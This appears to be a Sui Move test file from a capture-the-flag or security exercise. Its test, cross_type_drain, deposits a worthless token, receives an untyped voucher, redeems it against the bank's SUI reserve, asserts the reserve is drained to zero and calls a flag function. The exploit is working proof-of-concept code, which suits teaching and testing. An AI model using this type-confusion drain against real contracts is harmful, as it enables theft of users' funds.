#[test_only]
module cross_collateral::bank_tests;

use cross_collateral::bank;
use sui::coin;
use sui::sui::SUI;
use sui::test_scenario as ts;
use sui::test_utils;

public struct CHEAP has drop {}

#[test]
fun cross_type_drain() {
    let attacker = @0xA;
    let mut sc = ts::begin(attacker);

    let mut bank = bank::create(ts::ctx(&mut sc));
    // the bank's valuable reserve
    bank::fund<SUI>(&mut bank, coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc)));

    // deposit 1,000,000 units of a worthless token -> Voucher { value: 1_000_000 }
    let voucher = bank::deposit<CHEAP>(
        &mut bank,
        coin::mint_for_testing<CHEAP>(1_000_000, ts::ctx(&mut sc)),
        ts::ctx(&mut sc),
    );

    // the voucher carries no type: redeem it against SUI instead
    let loot = bank::withdraw<SUI>(&mut bank, voucher, ts::ctx(&mut sc));
    assert!(coin::value(&loot) == 1_000_000, 0);
    assert!(bank::balance_of<SUI>(&bank) == 0, 1);
    bank::flag<SUI>(&bank);

    coin::burn_for_testing(loot);
    test_utils::destroy(bank);
    ts::end(sc);
}
